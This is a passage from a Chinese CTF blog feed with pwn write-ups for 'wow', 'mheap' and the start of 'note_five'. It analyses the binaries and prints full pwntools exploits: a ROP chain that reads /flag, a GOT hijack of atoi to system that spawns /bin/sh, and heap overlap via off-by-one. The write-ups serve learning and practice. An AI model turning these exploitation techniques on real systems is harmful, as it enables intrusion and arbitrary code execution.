punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"question\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"____?"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h1><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>通过分析看到这个题类似之前RCTF中的brainfuck，我们逆一下其对应的指令：<br>@== pointer++<br>#== pointer–<br>^ == (<em>pointer)++<br>|  == (*pointer)–<br>&amp;== putchar(pointer)<br>$ == getchar(pointer)<br>{ == while(p){<br>} == }<br>\</em>== pointer*4<br>~ == ~pointer<br>同样的我们利用一段代码测试一下：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">{</span>    p<span class="token operator">++</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">getchar</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会溢出一个字节，改code地址为ret地址，最后需要改回来。题目基本和RCTF的brainfuck一样，只不过指令换了，以及ORW的指令需要在binary中找，并且不能令地址中含有指令中的字符。</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./wow"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./wow"</span><span class="token punctuation">)</span>syscall <span class="token operator">=</span> <span class="token number">0x00000000004dc054</span> pop_rdi <span class="token operator">=</span> <span class="token number">0x41307a</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x53048b</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x47383d</span>pop_rax <span class="token operator">=</span> <span class="token number">0x53048a</span><span class="token keyword">def</span> <span class="token function">call_func</span><span class="token punctuation">(</span>sysNum<span class="token punctuation">,</span>param1<span class="token punctuation">,</span>param2<span class="token punctuation">,</span>param3<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pop_rax<span class="token punctuation">,</span>sysNum<span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span>param1<span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>param2<span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span>param3<span class="token punctuation">,</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadcode <span class="token operator">=</span> <span class="token string">"^{@&amp;^}$"</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"code:\n"</span><span class="token punctuation">,</span>code<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token number">0x3ff</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\x38"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"continue?\n"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"enter your code:\n"</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> call_func<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x5D3700</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read</span>shell<span class="token operator">+=</span> call_func<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x5D3700</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># open</span>shell<span class="token operator">+=</span> call_func<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x5D3700</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read</span>shell<span class="token operator">+=</span> call_func<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x5D3700</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shell<span class="token operator">+</span>code<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#raw_input()</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xe0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"continue?"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/flag\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO leak </tag>
            
            <tag> double free </tag>
            
            <tag> off by one </tag>
            
            <tag> house of orange </tag>
            
            <tag> C++ </tag>
            
            <tag> 解释器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ByteCTF部分PWN复盘</title>
      <link href="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/"/>
      <url>/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/</url>
      
        <content type="html"><![CDATA[<p>大概去年十一月份写的，拿过来再看一下</p><h1 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h1><h2 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/0.png"></div>看到也许可以hijacking GOT或者hijacking hook## 0x02 源码分析### 创建功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/1.png"></div>貌似看起来没什么问题。### 打印函数<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/2.png"></div>### 删除功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/3.png"></div>没有UAF，Double Free### 编辑功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/4.png"></div>最多只能编辑16个byte<p>通过调试发现并没有free和malloc功能，也就是说不能hijacking hook了。这个程序 是自己定义了一种类似堆的分配策略。现如下说明，当其分配的时候：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/5.png"></div><p>当其删除后：<br>这里不变，只是把对应chunk的指针删除了</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/6.png"></div>数据地址内存如下：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/7.png"></div>删除的首地址出现在数据地址部分**漏洞函数分析：**<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/8.png"></div>程序首先用mmap分配了一个基址为0x23330000，大小为0x1000的chunk，来实现分配机制<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/9.png"></div>没有限制大小，漏洞从这里开始。我们可以分配大于0x23330000的chunk。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/10.png"></div>**这里：当read向非法地址写入数据的时候会返回-1。这样就可以向低地址溢出写。x:if(True)才会执行-1 == True0 == False!(-1) == False**这里尝试调试一下：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/11.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/12.png"></div>链表的指针在chunk里面## 0x03 思路分析<h3 id="综合分析"><a href="#综合分析" class="headerlink" title="综合分析"></a>综合分析</h3><p><strong><u>首先我们需要掌握这几个点</u></strong><br>1.分配的时候会便利空闲chunk链表，空闲chunk的状态如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/13.png"></div>2.分配最大size是0xff0，那么最后一个chunk超过这个范围值的情况，根据读入的漏洞函数则会往前覆盖数据<p>那么我们的目标就是：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/14.png"></div>将最后一块释放，同时通过复写修改fd到chunklist，这时候再分配跟chunklist里面size位大小相同的chunk则会将这个chunklist表内存分给新 chunk。<p><u><strong>步骤很简单，分析很难</strong></u></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/15.png"></div><h3 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h3><h4 id="步骤一-覆盖fd指针，同时分配合适大小的chunk，劫持chunklist链表："><a href="#步骤一-覆盖fd指针，同时分配合适大小的chunk，劫持chunklist链表：" class="headerlink" title="步骤一  覆盖fd指针，同时分配合适大小的chunk，劫持chunklist链表："></a>步骤一  覆盖fd指针，同时分配合适大小的chunk，劫持chunklist链表：</h4><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xfa0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># now memory is 0xff0-0xfb0=0x40</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x2f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># now 0x40-0x30</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x3f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># overwrite fd pointer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="步骤二-泄露libc算出offset，劫持atoi函数："><a href="#步骤二-泄露libc算出offset，劫持atoi函数：" class="headerlink" title="步骤二 泄露libc算出offset，劫持atoi函数："></a>步骤二 泄露libc算出offset，劫持atoi函数：</h4><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x0000000023330fa0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># alloc small size like fd pointer chunk's size</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data <span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> data<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./mheap'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./mheap'</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>target_addr <span class="token operator">=</span> <span class="token number">0x4040d0</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xfa0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># now memory is 0xff0-0xfb0=0x40</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x2f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># now 0x40-0x30</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x3f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># overwrite fd pointer</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x0000000023330fa0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># alloc small size like fd pointer chunk's size</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data <span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> data<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h1><h2 id="0x01-查看文件-1"><a href="#0x01-查看文件-1" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/16.png"></div>这里 首先考虑两种办法：hijacking hook和hijacking io_file## 0x02  IDA分析### 功能一：create<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/17.png"></div>最多可以创建5个chunk，（4可以看到不能创建fastbin，而且创建的时候并没有检查指针是否占用，也就是可以 重复创建### 功能二：edit<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/18.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/19.png"></div><p>漏洞存在：off by one</p><h3 id="功能三：delete"><a href="#功能三：delete" class="headerlink" title="功能三：delete"></a>功能三：delete</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/20.png"></div>没有UAF**稍微总结一下：目前看来不提供fastbin attack，不能泄露地址信息，仅仅一个unsorted bin attack和overlapping，貌似看起来很懵逼...**## 0x03 思路通过阅读大佬的exp，现在进行简单的思路总结：<p>思路一<br>首先要进行hijacking hook或者hijacking io_file都必须泄露地址这是毫无疑问的，那么泄露地址无非就这几种：打印函数或者stdout。这里看来没有直接打印的函数，而且构造起来更加困难。我们考虑第二种利用stdout打印：那么需要满足一个条件就是利用chunk控制那一块地址。那么只有fastbin attack可以简单的分配到任意地址。我们怎么只能修改global_max_size才可以利用fastbin attack。</p><p>其次打印了地址计算了libc基址后，我们需要利用io_file attack来劫持程序流。</p><p>思路二<br>思路简单实操很难。。。</p><h2 id="0x04-详细步骤"><a href="#0x04-详细步骤" class="headerlink" title="0x04 详细步骤"></a>0x04 详细步骤</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p> <strong>第一步：像一个free的chunk中的bk指针内写入global_max_fast的地址-0x10。方法是用一个大chunk内控制小chunk</strong><br><strong>回答:这个方法其实是非主流的shrink方法:至于为什么要0xe1,是因为后面申请的是0x1d0,如果想用f1,那么后面就需要用分配0x1e0<br>测试可以通过.</strong></p><p>具体怎么做呢：首先释放时要引起合并，然后再分配一个大的chunk，这个chunk就包含着小的了，同时就可以进行编辑小的chunk。那么释放的chunk的presize肯定不为0才能可以合并。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 控制一个大chunk里面包含小chunk</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe8</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span> create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1d0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 最后一位为0代表前面没有使用！！！！蠢死！</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span 